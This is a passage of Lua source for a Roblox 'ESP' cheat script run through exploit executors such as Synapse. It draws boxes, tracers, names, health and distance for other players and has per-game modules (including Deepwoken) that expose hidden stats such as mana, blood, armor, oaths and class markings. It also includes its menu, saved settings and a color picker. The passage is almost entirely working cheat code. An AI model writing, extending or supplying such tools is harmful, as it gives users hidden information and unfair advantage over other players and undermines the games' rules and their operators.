					if Character:FindFirstChild'Vampirism' 		then table.insert(Extra, 'V'); end
					if Character:FindFirstChild'Observe'		then table.insert(Extra, 'ILL'); end
					if Character:FindFirstChild'Inferi'			then table.insert(Extra, 'NEC'); end
					if Character:FindFirstChild'World\'s Pulse' then table.insert(Extra, 'DZIN'); end
					if Character:FindFirstChild'Shift'		 	then table.insert(Extra, 'MAD'); end
					if Character:FindFirstChild'Head' and Character.Head:FindFirstChild'FacialMarking' then
						local FM = Character.Head:FindFirstChild'FacialMarking';
						if FM.Texture == 'http://www.roblox.com/asset/?id=4072968006' then
							table.insert(Extra, 'HEALER');
						elseif FM.Texture == 'http://www.roblox.com/asset/?id=4072914434' then
							table.insert(Extra, 'SEER');
						elseif FM.Texture == 'http://www.roblox.com/asset/?id=4094417635' then
							table.insert(Extra, 'JESTER');
						elseif FM.Texture == 'http://www.roblox.com/asset/?id=4072968656' then
							table.insert(Extra, 'BLADE');
						end
					end
				end
				if Player:FindFirstChild'Backpack' then
					if Player.Backpack:FindFirstChild'Observe' 			then table.insert(Extra, 'ILL');  end
					if Player.Backpack:FindFirstChild'Inferi'			then table.insert(Extra, 'NEC');  end
					if Player.Backpack:FindFirstChild'World\'s Pulse' 	then table.insert(Extra, 'DZIN'); end
					if Player.Backpack:FindFirstChild'Shift'		 	then table.insert(Extra, 'MAD'); end
				end

				if #Extra > 0 then Name = Name .. ' [' .. table.concat(Extra, '-') .. ']'; end
			end

			return Name;
		end;
	};
	[3541987450] = {
		CustomPlayerTag = function(Player)
			local Name = '';

			if Player:FindFirstChild'leaderstats' then
				Name = Name .. '\n[';
				local Prefix = '';
				local Extra = {};
				if Player.leaderstats:FindFirstChild'Prestige' and Player.leaderstats.Prestige.ClassName == 'IntValue' and Player.leaderstats.Prestige.Value > 0 then
					Name = Name .. '#' .. tostring(Player.leaderstats.Prestige.Value) .. ' ';
				end
				if Player.leaderstats:FindFirstChild'HouseRank' and Player.leaderstats:FindFirstChild'Gender' and Player.leaderstats.HouseRank.ClassName == 'StringValue' and not IsStringEmpty(Player.leaderstats.HouseRank.Value) then
					Prefix = Player.leaderstats.HouseRank.Value == 'Owner' and (Player.leaderstats.Gender.Value == 'Female' and 'Lady ' or 'Lord ') or '';
				end
				if Player.leaderstats:FindFirstChild'FirstName' and Player.leaderstats.FirstName.ClassName == 'StringValue' and not IsStringEmpty(Player.leaderstats.FirstName.Value) then
					Name = Name .. '' .. Prefix .. Player.leaderstats.FirstName.Value;
				end
				if Player.leaderstats:FindFirstChild'LastName' and Player.leaderstats.LastName.ClassName == 'StringValue' and not IsStringEmpty(Player.leaderstats.LastName.Value) then
					Name = Name .. ' ' .. Player.leaderstats.LastName.Value;
				end
				if Player.leaderstats:FindFirstChild'UberTitle' and Player.leaderstats.UberTitle.ClassName == 'StringValue' and not IsStringEmpty(Player.leaderstats.UberTitle.Value) then
					Name = Name .. ', ' .. Player.leaderstats.UberTitle.Value;
				end

				if not IsStringEmpty(Name) then Name = Name .. ']'; end

				local Character = GetCharacter(Player);

				if Character then
					if Character and Character:FindFirstChild'Danger' then table.insert(Extra, 'D'); end
					if Character:FindFirstChild'ManaAbilities' and Character.ManaAbilities:FindFirstChild'ManaSprint' then table.insert(Extra, 'D1'); end

					if Character:FindFirstChild'Mana'	 		then table.insert(Extra, 'M' .. math.floor(Character.Mana.Value)); end
					if Character:FindFirstChild'Vampirism' 		then table.insert(Extra, 'V');    end
					if Character:FindFirstChild'Observe'			then table.insert(Extra, 'ILL');  end
					if Character:FindFirstChild'Inferi'			then table.insert(Extra, 'NEC');  end
					
					if Character:FindFirstChild'World\'s Pulse' 	then table.insert(Extra, 'DZIN'); end
					if Character:FindFirstChild'Head' and Character.Head:FindFirstChild'FacialMarking' then
						local FM = Character.Head:FindFirstChild'FacialMarking';
						if FM.Texture == 'http://www.roblox.com/asset/?id=4072968006' then
							table.insert(Extra, 'HEALER');
						elseif FM.Texture == 'http://www.roblox.com/asset/?id=4072914434' then
							table.insert(Extra, 'SEER');
						elseif FM.Texture == 'http://www.roblox.com/asset/?id=4094417635' then
							table.insert(Extra, 'JESTER');
						end
					end
				end
				if Player:FindFirstChild'Backpack' then
					if Player.Backpack:FindFirstChild'Observe' 			then table.insert(Extra, 'ILL');  end
					if Player.Backpack:FindFirstChild'Inferi'			then table.insert(Extra, 'NEC');  end
					if Player.Backpack:FindFirstChild'World\'s Pulse' 	then table.insert(Extra, 'DZIN'); end
				end

				if #Extra > 0 then Name = Name .. ' [' .. table.concat(Extra, '-') .. ']'; end
			end

			return Name;
		end;
	};

	[4691401390] = { -- Vast Realm
		CustomCharacter = function(Player)
			if workspace:FindFirstChild'Players' then
				return workspace.Players:FindFirstChild(Player.Name);
			end
		end
	};

    [6032399813] = { -- Deepwoken [Etrean]
		CustomPlayerTag = function(Player)
			local Name = '';
            CharacterName = Player:GetAttribute'CharacterName'; -- could use leaderstats but lazy

            if not IsStringEmpty(CharacterName) then
                Name = ('\n[%s]'):format(CharacterName);
                local Character = GetCharacter(Player);
                local Extra = {};

                if Character then
                    local Blood, Armor = Character:FindFirstChild('Blood'), Character:FindFirstChild('Armor');

                    if Blood and Blood.ClassName == 'DoubleConstrainedValue' then
                        table.insert(Extra, ('B%d'):format(Blood.Value));
                    end

                    if Armor and Armor.ClassName == 'DoubleConstrainedValue' then
                        table.insert(Extra, ('A%d'):format(math.floor(Armor.Value / 10)));
                    end
                end

                local BackpackChildren = Player.Backpack:GetChildren()

                for index = 1, #BackpackChildren do
                    local Oath = BackpackChildren[index]
                    if Oath.ClassName == 'Folder' and Oath.Name:find('Talent:Oath') then
                        local OathName = Oath.Name:gsub('Talent:Oath: ', '')
                        table.insert(Extra, OathName);
                    end
                end

                if #Extra > 0 then Name = Name .. ' [' .. table.concat(Extra, '-') .. ']'; end
            end

			return Name;
		end;
	};

    [5735553160] = { -- Deepwoken [Depths]
    CustomPlayerTag = function(Player)
        local Name = '';
        CharacterName = Player:GetAttribute'CharacterName'; -- could use leaderstats but lazy

        if not IsStringEmpty(CharacterName) then
            Name = ('\n[%s]'):format(CharacterName);
            local Character = GetCharacter(Player);
            local Extra = {};

            if Character then
                local Blood, Armor = Character:FindFirstChild('Blood'), Character:FindFirstChild('Armor');

                if Blood and Blood.ClassName == 'DoubleConstrainedValue' then
                    table.insert(Extra, ('B%d'):format(Blood.Value));
                end

                if Armor and Armor.ClassName == 'DoubleConstrainedValue' then
                    table.insert(Extra, ('A%d'):format(math.floor(Armor.Value / 10)));
                end
            end

            local BackpackChildren = Player.Backpack:GetChildren()

            for index = 1, #BackpackChildren do
                local Oath = BackpackChildren[index]
                if Oath.ClassName == 'Folder' and Oath.Name:find('Talent:Oath') then
                    local OathName = Oath.Name:gsub('Talent:Oath: ', '')
                    table.insert(Extra, OathName);
                end
            end

            if #Extra > 0 then Name = Name .. ' [' .. table.concat(Extra, '-') .. ']'; end
        end

        return Name;
    end;
};
};

if Modules[game.PlaceId] ~= nil then
	local Module = Modules[game.PlaceId];
	CustomPlayerTag = Module.CustomPlayerTag or nil;
	CustomESP = Module.CustomESP or nil;
	CustomCharacter = Module.CustomCharacter or nil;
	GetHealth = Module.GetHealth or nil;
	GetAliveState = Module.GetAliveState or nil;
	CustomRootPartName = Module.CustomRootPartName or nil;
end

function GetCharacter(Player)
	return Player.Character or (CustomCharacter and CustomCharacter(Player));
end

function GetMouseLocation()
	return UserInputService:GetMouseLocation();
end

function MouseHoveringOver(Values)
	local X1, Y1, X2, Y2 = Values[1], Values[2], Values[3], Values[4]
	local MLocation = GetMouseLocation();
	return (MLocation.x >= X1 and MLocation.x <= (X1 + (X2 - X1))) and (MLocation.y >= Y1 and MLocation.y <= (Y1 + (Y2 - Y1)));
end

function GetTableData(t) -- basically table.foreach i dont even know why i made this
	if typeof(t) ~= 'table' then return end

	return setmetatable(t, {
		__call = function(t, func)
			if typeof(func) ~= 'function' then return end;
			for i, v in pairs(t) do
				pcall(func, i, v);
			end
		end;
	});
end
local function Format(format, ...)
	return string.format(format, ...);
end
function CalculateValue(Min, Max, Percent)
	return Min + math.floor(((Max - Min) * Percent) + .5);
end

function NewDrawing(InstanceName)
	local Instance = Drawing.new(InstanceName);
	-- pcall(Set, Instance, 'OutlineOpacity', 0.8)
	return (function(Properties)
		for i, v in pairs(Properties) do
			pcall(Set, Instance, i, v);
		end
		return Instance;
	end)
end

function Menu:AddMenuInstance(Name, DrawingType, Properties)
	local Instance;

	if shared.MenuDrawingData.Instances[Name] ~= nil then
		Instance = shared.MenuDrawingData.Instances[Name];
		for i, v in pairs(Properties) do
			pcall(Set, Instance, i, v);
		end
	else
		Instance = NewDrawing(DrawingType)(Properties);
	end

	shared.MenuDrawingData.Instances[Name] = Instance;

	return Instance;
end
function Menu:UpdateMenuInstance(Name)
	local Instance = shared.MenuDrawingData.Instances[Name];
	if Instance ~= nil then
		return (function(Properties)
			for i, v in pairs(Properties) do
				pcall(Set, Instance, i, v);
			end
			return Instance;
		end)
	end
end
function Menu:GetInstance(Name)
	return shared.MenuDrawingData.Instances[Name];
end

local Options = setmetatable({}, {
	__call = function(t, ...)
		local Arguments = {...};
		local Name = Arguments[1];
		OIndex = OIndex + 1;
		rawset(t, Name, setmetatable({
			Name			= Arguments[1];
			Text			= Arguments[2];
			Value			= Arguments[3];
			DefaultValue	= Arguments[3];
			AllArgs			= Arguments;
			Index			= OIndex;
		}, {
			__call = function(t, v, force)
				local self = t;

				if typeof(t.Value) == 'function' then
					t.Value();
				elseif typeof(t.Value) == 'EnumItem' then
					local BT = Menu:GetInstance(Format('%s_BindText', t.Name));
					if not force then
						Binding = true;
						local Val = 0
						while Binding do
							wait();
							Val = (Val + 1) % 17;
							BT.Text = Val <= 8 and '|' or '';
						end
					end
					t.Value = force and v or BindedKey;
					if BT and t.BasePosition and t.BaseSize then
						BT.Text = tostring(t.Value):match'%w+%.%w+%.(.+)';
						BT.Position = t.BasePosition + V2New(t.BaseSize.X - BT.TextBounds.X - 20, -10);
					end
				else
					local NewValue = v;
					if NewValue == nil then NewValue = not t.Value; end
					rawset(t, 'Value', NewValue);

					if Arguments[2] ~= nil and Menu:GetInstance'TopBar'.Visible then
						if typeof(Arguments[3]) == 'number' then
							local AMT = Menu:GetInstance(Format('%s_AmountText', t.Name));
							if AMT then
								AMT.Text = tostring(t.Value);
							end
						else
							local Inner = Menu:GetInstance(Format('%s_InnerCircle', t.Name));
							if Inner then Inner.Visible = t.Value; end
						end
					end
				end
			end;
		}));
	end;
})

function Load()
	local _, Result = pcall(readfile, OptionsFile);
	
	if _ then -- extremely ugly code yea i know but i dont care p.s. i hate pcall
		local _, Table = pcall(HttpService.JSONDecode, HttpService, Result);
		if _ and typeof(Table) == 'table' then
			for i, v in pairs(Table) do
				if typeof(Options[i]) == 'table' and Options[i].Value ~= nil and (typeof(Options[i].Value) == 'boolean' or typeof(Options[i].Value) == 'number') then
					Options[i].Value = v.Value;
					pcall(Options[i], v.Value);
				end
			end

			if Table.TeamColor then TeamColor = Color3.new(Table.TeamColor.R, Table.TeamColor.G, Table.TeamColor.B) end
			if Table.EnemyColor then EnemyColor = Color3.new(Table.EnemyColor.R, Table.EnemyColor.G, Table.EnemyColor.B) end

			if typeof(Table.MenuKey) == 'string' then Options.MenuKey(Enum.KeyCode[Table.MenuKey], true) end
			if typeof(Table.ToggleKey) == 'string' then Options.ToggleKey(Enum.KeyCode[Table.ToggleKey], true) end
		end
	end
end

Options('Enabled', 'ESP Enabled', true);
Options('ShowTeam', 'Show Team', true);
Options('ShowTeamColor', 'Show Team Color', false);
Options('ShowName', 'Show Names', true);
Options('ShowDistance', 'Show Distance', true);
Options('ShowHealth', 'Show Health', true);
Options('ShowBoxes', 'Show Boxes', true);
Options('ShowTracers', 'Show Tracers', true);
Options('ShowDot', 'Show Head Dot', false);
Options('VisCheck', 'Visibility Check', false);
Options('Crosshair', 'Crosshair', false);
Options('TextOutline', 'Text Outline', true);
-- Options('Rainbow', 'Rainbow Mode', false);
Options('TextSize', 'Text Size', syn and 18 or 14, 10, 24); -- cuz synapse fonts look weird???
Options('MaxDistance', 'Max Distance', 2500, 100, 25000);
Options('RefreshRate', 'Refresh Rate (ms)', 5, 1, 200);
Options('YOffset', 'Y Offset', 0, -200, 200);
Options('MenuKey', 'Menu Key', Enum.KeyCode.F4, 1);
Options('ToggleKey', 'Toggle Key', Enum.KeyCode.F3, 1);
Options('ChangeColors', SENTINEL_LOADED and 'Sentinel Unsupported' or 'Change Colors', function()
	if SENTINEL_LOADED then return end

	SubMenu:Show(GetMouseLocation(), 'Unnamed Colors', {
		{
			Type = 'Color'; Text = 'Team Color'; Color = TeamColor;

			Function = function(Circ, Position)
				if tick() - ColorPicker.LastGenerated < 1 then return; end

				if shared.CurrentColorPicker then shared.CurrentColorPicker:Dispose() end
				local ColorPicker = ColorPicker.new(Position - V2New(-10, 50));
				CurrentColorPicker = ColorPicker;
				shared.CurrentColorPicker = CurrentColorPicker;
				ColorPicker.ColorChanged:Connect(function(Color) Circ.Color = Color TeamColor = Color Options.TeamColor = Color end);
			end
		};
		{
			Type = 'Color'; Text = 'Enemy Color'; Color = EnemyColor;

			Function = function(Circ, Position)
				if tick() - ColorPicker.LastGenerated < 1 then return; end

				if shared.CurrentColorPicker then shared.CurrentColorPicker:Dispose() end
				local ColorPicker = ColorPicker.new(Position - V2New(-10, 50));
				CurrentColorPicker = ColorPicker;
				shared.CurrentColorPicker = CurrentColorPicker;
				ColorPicker.ColorChanged:Connect(function(Color) Circ.Color = Color EnemyColor = Color Options.EnemyColor = Color end);
			end
		};
		{
			Type = 'Button'; Text = 'Reset Colors';

			Function = function()
				EnemyColor = Color3.new(1, 0, 0);
				TeamColor = Color3.new(0, 1, 0);

				local C1 = Menu:GetInstance'Sub-ColorPreview.1'; if C1 then C1.Color = TeamColor end
				local C2 = Menu:GetInstance'Sub-ColorPreview.2'; if C2 then C2.Color = EnemyColor end
			end
		};
		{
			Type = 'Button'; Text = 'Rainbow Mode';

			Function = function()
				Rainbow = not Rainbow;
			end
		};
	});
end, 2);
Options('ResetSettings', 'Reset Settings', function()
	for i, v in pairs(Options) do
		if Options[i] ~= nil and Options[i].Value ~= nil and Options[i].Text ~= nil and (typeof(Options[i].Value) == 'boolean' or typeof(Options[i].Value) == 'number' or typeof(Options[i].Value) == 'EnumItem') then
			Options[i](Options[i].DefaultValue, true);
		end
	end
end, 5);
Options('LoadSettings', 'Load Settings', Load, 4);
Options('SaveSettings', 'Save Settings', function()
	local COptions = {};

	for i, v in pairs(Options) do
		COptions[i] = v;
	end
	
	if typeof(TeamColor) == 'Color3' then COptions.TeamColor = { R = TeamColor.R; G = TeamColor.G; B = TeamColor.B } end
	if typeof(EnemyColor) == 'Color3' then COptions.EnemyColor = { R = EnemyColor.R; G = EnemyColor.G; B = EnemyColor.B } end
	
	if typeof(COptions.MenuKey.Value) == 'EnumItem' then COptions.MenuKey = COptions.MenuKey.Value.Name end
	if typeof(COptions.ToggleKey.Value) == 'EnumItem' then COptions.ToggleKey = COptions.ToggleKey.Value.Name end

	writefile(OptionsFile, HttpService:JSONEncode(COptions));
end, 3);

Load(1);

Options('MenuOpen', nil, true);

local function Combine(...)
	local Output = {};
	for i, v in pairs{...} do
		if typeof(v) == 'table' then
			table.foreach(v, function(i, v)
				Output[i] = v;
			end)
		end
	end
	return Output
end

function LineBox:Create(Properties)
	local Box = { Visible = true }; -- prevent errors not really though dont worry bout the Visible = true thing

	local Properties = Combine({
		Transparency	= 1;
		Thickness		= 3;
		Visible			= true;
	}, Properties);

	if shared.am_ic3 then -- sory just my preference, dynamic boxes will be optional in unnamed esp v2
		Box['OutlineSquare']= NewDrawing'Square'(Properties);
		Box['Square'] 		= NewDrawing'Square'(Properties);
	elseif QUAD_SUPPORTED_EXPLOIT then
		Box['Quad']			= NewDrawing'Quad'(Properties);
	else
		Box['TopLeft']		= NewDrawing'Line'(Properties);
		Box['TopRight']		= NewDrawing'Line'(Properties);
		Box['BottomLeft']	= NewDrawing'Line'(Properties);
		Box['BottomRight']	= NewDrawing'Line'(Properties);
	end

	function Box:Update(CF, Size, Color, Properties, Parts)
		if not CF or not Size then return end

		if shared.am_ic3 and typeof(Parts) == 'table' then
			local AllCorners = {};
			
			for i, v in pairs(Parts) do
				-- if not v:IsA'BasePart' then continue end
				
				local CF, Size = v.CFrame, v.Size;
				-- CF, Size = v.Parent:GetBoundingBox();

				local Corners = {
					Vector3.new(CF.X + Size.X / 2, CF.Y + Size.Y / 2, CF.Z + Size.Z / 2);
					Vector3.new(CF.X - Size.X / 2, CF.Y + Size.Y / 2, CF.Z + Size.Z / 2);
					Vector3.new(CF.X - Size.X / 2, CF.Y - Size.Y / 2, CF.Z - Size.Z / 2);
					Vector3.new(CF.X + Size.X / 2, CF.Y - Size.Y / 2, CF.Z - Size.Z / 2);
					Vector3.new(CF.X - Size.X / 2, CF.Y + Size.Y / 2, CF.Z - Size.Z / 2);
					Vector3.new(CF.X + Size.X / 2, CF.Y + Size.Y / 2, CF.Z - Size.Z / 2);
					Vector3.new(CF.X - Size.X / 2, CF.Y - Size.Y / 2, CF.Z + Size.Z / 2);
					Vector3.new(CF.X + Size.X / 2, CF.Y - Size.Y / 2, CF.Z + Size.Z / 2);
				};

				for i, v in pairs(Corners) do
					table.insert(AllCorners, v);
				end

				-- break
			end

			local xMin, yMin = Camera.ViewportSize.X, Camera.ViewportSize.Y;
			local xMax, yMax = 0, 0;
			local Vs = true;

			for i, v in pairs(AllCorners) do				
				local Position, V = WorldToViewport(v);

				if VS and not V then Vs = false break end

				if Position.X > xMax then
					xMax = Position.X;
				end
				if Position.X < xMin then
					xMin = Position.X;
				end
				if Position.Y > yMax then
					yMax = Position.Y;
				end
				if Position.Y < yMin then
					yMin = Position.Y;
				end
			end

			local xSize, ySize = xMax - xMin, yMax - yMin;

			local Outline = Box['OutlineSquare'];
			local Square = Box['Square'];
			Outline.Visible = Vs;
			Square.Visible = Vs;
			Square.Position = V2New(xMin, yMin);
			Square.Color	= Color;
			Square.Thickness = math.floor(Outline.Thickness * 0.3);
			-- Square.Position = V2New(xMin, yMin);
			Square.Size = V2New(xSize, ySize);
			Outline.Position = Square.Position;
			Outline.Size = Square.Size;
			Outline.Color = Color3.new(0.12, 0.12, 0.12);
			Outline.Transparency = 0.75;

			return
		end
		
		local TLPos, Visible1	= WorldToViewport((CF * CFrame.new( Size.X,  Size.Y, 0)).Position);
		local TRPos, Visible2	= WorldToViewport((CF * CFrame.new(-Size.X,  Size.Y, 0)).Position);
		local BLPos, Visible3	= WorldToViewport((CF * CFrame.new( Size.X, -Size.Y, 0)).Position);
		local BRPos, Visible4	= WorldToViewport((CF * CFrame.new(-Size.X, -Size.Y, 0)).Position);

		local Quad = Box['Quad'];

		if QUAD_SUPPORTED_EXPLOIT then
			if Visible1 and Visible2 and Visible3 and Visible4 then
				Quad.Visible = true;
				Quad.Color	= Color;
				Quad.PointA = V2New(TLPos.X, TLPos.Y);
				Quad.PointB = V2New(TRPos.X, TRPos.Y);
				Quad.PointC = V2New(BRPos.X, BRPos.Y);
				Quad.PointD = V2New(BLPos.X, BLPos.Y);
			else
				Box['Quad'].Visible = false;
			end
		else
			Visible1 = TLPos.Z > 0 -- (commented | reason: random flashes);
			Visible2 = TRPos.Z > 0 -- (commented | reason: random flashes);
			Visible3 = BLPos.Z > 0 -- (commented | reason: random flashes);
			Visible4 = BRPos.Z > 0 -- (commented | reason: random flashes);

			-- ## BEGIN UGLY CODE
			if Visible1 then
				Box['TopLeft'].Visible		= true;
				Box['TopLeft'].Color		= Color;
				Box['TopLeft'].From			= V2New(TLPos.X, TLPos.Y);
				Box['TopLeft'].To			= V2New(TRPos.X, TRPos.Y);
			else
				Box['TopLeft'].Visible		= false;
			end
			if Visible2 then
				Box['TopRight'].Visible		= true;
				Box['TopRight'].Color		= Color;
				Box['TopRight'].From		= V2New(TRPos.X, TRPos.Y);
				Box['TopRight'].To			= V2New(BRPos.X, BRPos.Y);
			else
				Box['TopRight'].Visible		= false;
			end
			if Visible3 then
				Box['BottomLeft'].Visible	= true;
				Box['BottomLeft'].Color		= Color;
				Box['BottomLeft'].From		= V2New(BLPos.X, BLPos.Y);
				Box['BottomLeft'].To		= V2New(TLPos.X, TLPos.Y);
			else
				Box['BottomLeft'].Visible	= false;
			end
			if Visible4 then
				Box['BottomRight'].Visible	= true;
				Box['BottomRight'].Color	= Color;
				Box['BottomRight'].From		= V2New(BRPos.X, BRPos.Y);
				Box['BottomRight'].To		= V2New(BLPos.X, BLPos.Y);
			else
				Box['BottomRight'].Visible	= false;
			end
			-- ## END UGLY CODE
			if Properties and typeof(Properties) == 'table' then
				GetTableData(Properties)(function(i, v)
					pcall(Set, Box['TopLeft'],		i, v);
					pcall(Set, Box['TopRight'],		i, v);
					pcall(Set, Box['BottomLeft'],	i, v);
					pcall(Set, Box['BottomRight'],	i, v);
				end)
			end
		end
	end
	function Box:SetVisible(bool)
		if shared.am_ic3 then
			Box['Square'].Visible = bool;
			Box['OutlineSquare'].Visible = bool;
		else
			pcall(Set, Box['Quad'],				'Visible', bool);
		end
		-- pcall(Set, Box['TopLeft'],		'Visible', bool);
		-- pcall(Set, Box['TopRight'],		'Visible', bool);
		-- pcall(Set, Box['BottomLeft'],	'Visible', bool);
		-- pcall(Set, Box['BottomRight'],	'Visible', bool);
	end
	function Box:Remove()
		self:SetVisible(false);
		if shared.am_ic3 then
			Box['Square']:Remove();
			Box['OutlineSquare']:Remove();
		else
			Box['Quad']:Remove();
		end
		-- Box['TopLeft']:Remove();
		-- Box['TopRight']:Remove();
		-- Box['BottomLeft']:Remove();
		-- Box['BottomRight']:Remove();
	end

	return Box;
end

local Colors = {
	White = FromHex'ffffff';
	Primary = {
		Main	= FromHex'424242';
		Light	= FromHex'6d6d6d';
		Dark	= FromHex'1b1b1b';
	};
	Secondary = {
		Main	= FromHex'e0e0e0';
		Light	= FromHex'ffffff';
		Dark	= FromHex'aeaeae';
	};
};

function Connections:Listen(Connection, Function)
    local NewConnection = Connection:Connect(Function);
    table.insert(self.Active, NewConnection);
    return NewConnection;
end

function Connections:DisconnectAll()
    for Index, Connection in pairs(self.Active) do
        if Connection.Connected then
            Connection:Disconnect();
        end
    end
    
    self.Active = {};
end

function Signal.new()
	local self = setmetatable({ _BindableEvent = Instance.new'BindableEvent' }, Signal);
    
	return self;
end

function Signal:Connect(Callback)
    assert(typeof(Callback) == 'function', 'function expected; got ' .. typeof(Callback));

	return self._BindableEvent.Event:Connect(function(...) Callback(...) end);
end

function Signal:Fire(...)
    self._BindableEvent:Fire(...);
end

function Signal:Wait()
    local Arguments = self._BindableEvent:Wait();

    return Arguments;
end

function Signal:Disconnect()
    if self._BindableEvent then
        self._BindableEvent:Destroy();
    end
end

local function GetMouseLocation()
	return UserInputService:GetMouseLocation();
end

local function IsMouseOverDrawing(Drawing, MousePosition)
	local TopLeft = Drawing.Position;
	local BottomRight = Drawing.Position + Drawing.Size;
    local MousePosition = MousePosition or GetMouseLocation();
    
    return MousePosition.X > TopLeft.X and MousePosition.Y > TopLeft.Y and MousePosition.X < BottomRight.X and MousePosition.Y < BottomRight.Y;
end

local ImageCache = {};

local function SetImage(Drawing, Url)
	local Data = IsSynapse and game:HttpGet(Url) or Url;

	print(Drawing, IsSynapse)

	Drawing[IsSynapse and 'Data' or 'Uri'] = ImageCache[Url] or Data;
	ImageCache[Url] = Data;
    
    if not IsSynapse then repeat wait() until Drawing.Loaded; end
end

-- oh god unnamed esp needs an entire rewrite, someone make a better one pls im too lazy
-- btw the color picker was made seperately so it doesnt fit with the code of unnamed esp

local function CreateDrawingsTable()
    local Drawings = { __Objects = {} };
    local Metatable = {};

    function Metatable.__index(self, Index)
        local Object = rawget(self.__Objects, Index);
        
        if not Object or (IsSynapse and not Object.__SELF.__OBJECT_EXISTS) then
            local Type = Index:sub(1, Index:find'-' - 1);

            Success, Object = pcall(Drawing.new, Type);

            if not Object or not Success then return function() end; end

            self.__Objects[Index] = setmetatable({ __SELF = Object; Type = Type }, {
                __call = function(self, Properties)
                    local Object = rawget(self, '__SELF'); if IsSynapse and not Object.__OBJECT_EXISTS then return false, 'render object destroyed'; end

                    if Properties == false then
                        Object.Visible = false;
                        Object.Transparency = 0;
                        Object:Remove();
                        
                        return true;
                    end
                    
                    if typeof(Properties) == 'table' then
                        for Property, Value in pairs(Properties) do
                            local CanSet = true;

                            if self.Type == 'Image' and not IsSynapse and Property == 'Size' and typeof(Value) == 'Vector2' then
                                CanSet = false;

                                spawn(function()
                                    repeat wait() until Object.Loaded;
                                    if not self.DefaultSize then rawset(self, 'DefaultSize', Object.Size) end

                                    Property = 'ScaleFactor';
                                    Value = Value.X / self.DefaultSize.X;

                                    Object[Property] = Value
                                end)
                            end
                            
                            if CanSet then Object[Property] = Value end
                        end
                    end

                    return Object;
                end
            });

            Object.Visible = true;
            Object.Transparency = 1; -- Transparency is really Opacity with drawing api (1 being visible, 0 being invisible)
            
            if Type == 'Text' then
                if Drawing.Fonts then Object.Font = Drawing.Fonts.Monospace end
                Object.Size = 20;
                Object.Color = Color3.new(1, 1, 1);
                Object.Center = true;
				Object.Outline = true;
				OutlineOpacity = 0.5;
            elseif Type == 'Square' or Type == 'Rectangle' then
                Object.Thickness = 2;
                Object.Filled = false;
            end

            return self.__Objects[Index];
        end

        return Object;
    end

    function Metatable.__call(self, Delete, ...)
        local Arguments = {Delete, ...};
        
        if Delete == false then
            for Index, Drawing in pairs(rawget(self, '__Objects')) do
                Drawing(false);
            end
        end
    end

    return setmetatable(Drawings, Metatable);
end

local Images = {};

spawn(function()
	Images.Ring = 'https://i.imgur.com/q4qx26f.png';
	Images.Overlay = 'https://i.imgur.com/gOCxbsR.png';
end)

function ColorPicker.new(Position, Size, Color)
	ColorPicker.LastGenerated = tick();
	ColorPicker.Loading = true;

    local Picker = { Color = Color or Color3.new(1, 1, 1); HSV = { H = 0, S = 1, V = 1 } };
    local Drawings = CreateDrawingsTable();
    local Position = Position or V2New();
    local Size = Size or 150;
    local Padding = { 10, 10, 10, 10 };
    
    Picker.ColorChanged = Signal.new();

    local Background = Drawings['Square-Background'] {
        Color = Color3.fromRGB(33, 33, 33);
		Filled = false;
		Visible = false;
        Position = Position - V2New(Padding[4], Padding[1]);
        Size = V2New(Size, Size) + V2New(Padding[4] + Padding[2], Padding[1] + Padding[3]);
    };
    local ColorPreview = Drawings['Circle-Preview'] {
        Position = Position + (V2New(Size, Size) / 2);
        Radius = Size / 2 - 8;
        Filled = true;
        Thickness = 0;
        NumSides = 20;
        Color = Color3.new(1, 0, 0);
    };
    local Main = Drawings['Image-Main'] {
        Position = Position;
        Size = V2New(Size, Size);
    }; SetImage(Main, Images.Ring);
    local Preview = Drawings['Square-Preview'] {
        Position = Main.Position + (Main.Size / 4.5);
        Size = Main.Size / 1.75;
        Color = Color3.new(1, 0, 0);
        Filled = true;
        Thickness = 0;
    };
    local Overlay = Drawings['Image-Overlay'] {
        Position = Preview.Position;
        Size = Preview.Size;
        Transparency = 1;
    }; SetImage(Overlay, Images.Overlay);
    local CursorOutline = Drawings['Circle-CursorOutline'] {
        Radius = 4;
        Thickness = 2;
        Filled = false;
        Color = Color3.new(0.2, 0.2, 0.2);
        Position = V2New(Main.Position.X + Main.Size.X - 10, Main.Position.Y + (Main.Size.Y / 2));
    };
    local Cursor = Drawings['Circle-Cursor'] {
        Radius = 3;
        Transparency = 1;
        Filled = true;
        Color = Color3.new(1, 1, 1);
        Position = CursorOutline.Position;
    };
    local CursorOutline = Drawings['Circle-CursorOutlineSquare'] {
        Radius = 4;
        Thickness = 2;
        Filled = false;
        Color = Color3.new(0.2, 0.2, 0.2);
        Position = V2New(Preview.Position.X + Preview.Size.X - 2, Preview.Position.Y + 2);
    };
    Drawings['Circle-CursorSquare'] {
        Radius = 3;
        Transparency = 1;
        Filled = true;
        Color = Color3.new(1, 1, 1);
        Position = CursorOutline.Position;
    };
    
    function Picker:UpdatePosition(Input)
        local MousePosition = V2New(Input.Position.X, Input.Position.Y + 33);

        if self.MouseHeld then
            if self.Item == 'Ring' then
                local Main = self.Drawings['Image-Main'] ();
                local Preview = self.Drawings['Square-Preview'] ();
                local Bounds = Main.Size / 2;
                local Center = Main.Position + Bounds;
                local Relative = MousePosition - Center;
                local Direction = Relative.unit;
                local Position = Center + Direction * Main.Size.X / 2.15;
                local H = (math.atan2(Position.Y - Center.Y, Position.X - Center.X)) * 60;
                if H < 0 then H = 360 + H; end
                H = H / 360;
                self.HSV.H = H;
                local EndColor = Color3.fromHSV(H, self.HSV.S, self.HSV.V); if EndColor ~= self.Color then self.ColorChanged:Fire(self.Color); end
                local Pointer = self.Drawings['Circle-Cursor'] { Position = Position };
                self.Drawings['Circle-CursorOutline'] { Position = Pointer.Position };
                Bounds = Bounds * 2;
                Preview.Color = Color3.fromHSV(H, 1, 1);
                self.Color = EndColor;
                self.Drawings['Circle-Preview'] { Color = EndColor };
            elseif self.Item == 'HL' then
                local Preview = self.Drawings['Square-Preview'] ();
                local HSV = self.HSV;
                local Position = V2New(math.clamp(MousePosition.X, Preview.Position.X, Preview.Position.X + Preview.Size.X), math.clamp(MousePosition.Y, Preview.Position.Y, Preview.Position.Y + Preview.Size.Y));
                HSV.S = (Position.X - Preview.Position.X) / Preview.Size.X;
                HSV.V = 1 - (Position.Y - Preview.Position.Y) / Preview.Size.Y;
                local EndColor = Color3.fromHSV(HSV.H, HSV.S, HSV.V); if EndColor ~= self.Color then self.ColorChanged:Fire(self.Color); end
                self.Color = EndColor;
                self.Drawings['Circle-Preview'] { Color = EndColor };
                local Pointer = self.Drawings['Circle-CursorSquare'] { Position = Position };
